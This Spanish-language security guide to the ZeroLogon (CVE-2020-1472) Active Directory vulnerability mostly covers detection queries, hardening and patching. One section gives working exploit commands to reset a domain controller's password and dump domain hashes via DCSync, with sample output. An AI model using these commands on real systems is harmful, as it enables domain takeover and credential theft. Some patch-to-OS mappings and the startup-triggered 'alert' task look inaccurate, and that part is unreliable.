# üõë ZeroLogon en Active Directory

---

## üìù ¬øQu√© es ZeroLogon?

| Concepto      | Descripci√≥n                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definici√≥n**| ZeroLogon es una vulnerabilidad cr√≠tica (CVE-2020-1472) en el protocolo Netlogon de Windows que permite a un atacante sin autenticar obtener privilegios de administrador de dominio a trav√©s de la explotaci√≥n de un fallo en la implementaci√≥n criptogr√°fica. |
| **Requisito** | El atacante debe tener conectividad de red al controlador de dominio en el puerto 445 (SMB) y conocer el nombre del DC.                |

---

## üõ†Ô∏è ¬øC√≥mo funciona el ataque?

| Fase             | Acci√≥n                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Conexi√≥n**     | El atacante se conecta al controlador de dominio a trav√©s del protocolo Netlogon RPC/SMB.     |
| **Explotaci√≥n**  | Env√≠a m√∫ltiples intentos de autenticaci√≥n con IV (Initialization Vector) de ceros, aprovechando un fallo en la implementaci√≥n de AES-CFB8. |
| **Reseteo**      | Al tener √©xito, resetea la contrase√±a de la cuenta de m√°quina del DC a una cadena vac√≠a.       |
| **Escalada**     | Utiliza las credenciales comprometidas para ejecutar DCSync y volcar todos los hashes del dominio. |
| **Persistencia** | Puede crear cuentas de administrador de dominio o establecer otros m√©todos de persistencia.     |

---

## üíª Ejemplo pr√°ctico ofensivo (comandos reales)

```bash
# Verificar si el DC es vulnerable a ZeroLogon
python3 zerologon_tester.py DC01 192.168.1.10

# Explotar ZeroLogon para resetear contrase√±a del DC
python3 cve-2020-1472-exploit.py DC01 192.168.1.10

# Una vez explotado, realizar DCSync para extraer hashes
secretsdump.py -just-dc -no-pass 'DOMAIN/DC01$@192.168.1.10'

# Alternativa con impacket
python3 zerologon.py DC01 192.168.1.10

# Restaurar la contrase√±a original del DC (importante para estabilidad)
python3 restorepassword.py DOMAIN/administrator@DC01 -target-ip 192.168.1.10 -hexpass [hash_original]
```

```
[*] Testing ZeroLogon vulnerability on DC01...
[*] DC01 appears to be vulnerable to ZeroLogon!
[*] Attempting to exploit...
[*] Success! Machine account password reset.
[*] Performing DCSync attack...
[+] DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

---

## üìä Detecci√≥n en logs y SIEM

| Campo clave                   | Descripci√≥n                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 4624**          | Logon tipo 3 (red) con cuenta de m√°quina del DC desde IP externa.          |
| **EventCode = 4742**          | Modificaci√≥n de cuenta de m√°quina (reseteo de contrase√±a).                 |
| **EventCode = 4656**          | Acceso a objetos privilegiados (SAM, NTDS) inmediatamente despu√©s del reseteo. |
| **EventCode = 4768/4769**     | Solicitudes de tickets Kerberos an√≥malas con cuenta de m√°quina.            |
| **EventCode = 5136**          | Modificaciones en el directorio (cambios en cuentas cr√≠ticas).             |

### Query Splunk b√°sica

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4624 OR EventCode=4742 OR EventCode=4656 OR EventCode=4768 OR EventCode=4769)
| where like(Account_Name, "%$") AND Logon_Type=3
| table _time, ComputerName, Account_Name, Source_Network_Address, EventCode
```

---

## üîé Queries completas para m√°s investigaci√≥n

### 1. Detecci√≥n de reseteo de contrase√±a de cuenta de m√°quina

```splunk
index=dc_logs EventCode=4742 
| where like(TargetAccountName, "%$")
| table _time, TargetAccountName, SubjectAccountName, Computer, Source_Network_Address
```

### 2. Accesos RPC/SMB an√≥malos al DC

```splunk
index=dc_logs EventCode=4624 Logon_Type=3
| where like(Account_Name, "%$") AND Source_Network_Address!="127.0.0.1"
| stats count by _time, Account_Name, Source_Network_Address, Computer
| where count > 10
```

### 3. Solicitudes de tickets Kerberos con cuentas de m√°quina

```splunk
index=dc_logs (EventCode=4768 OR EventCode=4769)
| where like(Target_User_Name, "%$")
| table _time, Target_User_Name, Client_Address, Service_Name, Result_Code
```

### 4. Detecci√≥n de DCSync post-explotaci√≥n

```splunk
index=dc_logs EventCode=4662 Object_Type="domainDNS"
| where like(SubjectAccountName, "%$")
| table _time, SubjectAccountName, Object_Name, Operation_Type, Computer
```

### 5. M√∫ltiples intentos de autenticaci√≥n fallidos seguidos de √©xito

```splunk
index=dc_logs EventCode=4625 OR EventCode=4624
| where like(Account_Name, "%$")
| sort _time
| streamstats count as attempt_number by Account_Name, Source_Network_Address
| where attempt_number > 100
```

---

## ü¶æ Hardening y mitigaci√≥n

| Medida                                           | Descripci√≥n                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Patchear inmediatamente**                      | Aplicar KB4571723, KB4571748 y todas las actualizaciones posteriores que corrigen CVE-2020-1472. |
| **Habilitar firmado SMB obligatorio**           | `Set-SmbServerConfiguration -RequireSecuritySignature $true -Force` en todos los DCs.     |
| **Monitorizaci√≥n de cuentas de m√°quina**        | Vigilar eventos 4742 y 4624 tipo 3 con cuentas terminadas en $.                          |
| **Restringir acceso RPC/SMB al DC**             | Limitar conectividad al puerto 445 solo desde sistemas autorizados.                       |
| **Configurar SIEM alertas cr√≠ticas**            | Alertas inmediatas para reseteos de contrase√±a de cuentas DC$ y accesos RPC an√≥malos.     |
| **Auditor√≠a detallada de cambios en cuentas**   | Habilitar auditor√≠a de cambios en cuentas de equipo y servicios cr√≠ticos.                |

---

## üîß Parches y actualizaciones

| Parche/Update | Descripci√≥n                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB4571723** | Windows Server 2019 - Parche cr√≠tico principal para CVE-2020-1472 (ZeroLogon).             |
| **KB4571748** | Windows Server 2016 - Correcciones completas del protocolo Netlogon.                       |
| **KB4571694** | Windows Server 2012 R2 - Mitigaci√≥n esencial de vulnerabilidades criptogr√°ficas Netlogon.  |
| **KB4571729** | Windows 10/11 - Protecci√≥n del cliente contra ataques ZeroLogon.                           |
| **KB4571756** | Windows Server 2022 - Refuerzo de validaciones criptogr√°ficas en Netlogon.                 |

### Configuraciones de registro post-parche

```powershell
# Habilitar modo de compatibilidad estricto para Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -Value 1

# Configurar auditor√≠a detallada de Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "DBFlag" -Value 0x2080FFFF

# Habilitar logging de eventos de seguridad cr√≠ticos
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
```

### Verificaci√≥n de aplicaci√≥n de parches

```powershell
# Verificar que los parches ZeroLogon est√©n instalados
Get-HotFix -Id KB4571723, KB4571748, KB4571694, KB4571729

# Verificar configuraci√≥n de Netlogon post-parche
$netlogonConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -ErrorAction SilentlyContinue
if ($netlogonConfig.RequireStrongKey -eq 1) {
    Write-Host "‚úì Netlogon configurado con claves fuertes" -ForegroundColor Green
} else {
    Write-Host "‚úó ALERTA: RequireStrongKey no configurado" -ForegroundColor Red
}

# Verificar firmado SMB obligatorio
$smbConfig = Get-SmbServerConfiguration
if ($smbConfig.RequireSecuritySignature) {
    Write-Host "‚úì Firmado SMB obligatorio habilitado" -ForegroundColor Green
} else {
    Write-Host "‚úó CR√çTICO: Firmado SMB no obligatorio" -ForegroundColor Red
}
```

### Actualizaciones cr√≠ticas de seguridad relacionadas

- **CVE-2020-1472**: ZeroLogon protocolo Netlogon (KB4571723, KB4571748)
- **CVE-2020-1424**: Elevaci√≥n de privilegios Netlogon (KB4566424)
- **CVE-2021-26855**: Exchange Server RCE (relacionado si hay Exchange)
- **CVE-2021-34470**: Falsificaci√≥n de respuesta Netlogon (KB5005408)

### Configuraci√≥n avanzada de mitigaci√≥n

```powershell
# Script para configuraci√≥n defensiva completa
# Configurar pol√≠ticas de grupo para firmado SMB
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1

# Configurar auditor√≠a avanzada espec√≠fica para ZeroLogon
auditpol /set /subcategory:"Detailed Directory Service Replication" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Configurar alertas de seguridad en tiempo real
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command 'Send-MailMessage -To admin@company.com -Subject ALERT: Posible ZeroLogon -Body Evento cr√≠tico detectado'"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "ZeroLogonAlert" -Action $action -Trigger $trigger
```

---

## üßë‚Äçüíª ¬øC√≥mo verificar vulnerabilidad sin explotar?

```bash
# Usar scanner sin explotaci√≥n
python3 zerologon_tester.py [DC_NAME] [DC_IP]

# Verificar con nmap y scripts NSE
nmap -p 445 --script smb-vuln-cve-2020-1472 [DC_IP]

# Verificar configuraci√≥n desde el propio DC
Get-HotFix | Where-Object {$_.HotFixID -like "*4571*"}
```

---

## üìö Referencias

- [Microsoft Security Advisory CVE-2020-1472](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
- [ZeroLogon - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/zerologon)
- [Secura ZeroLogon Whitepaper](https://www.secura.com/blog/zero-logon)
- [Microsoft Netlogon Elevation of Privilege Vulnerability](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472)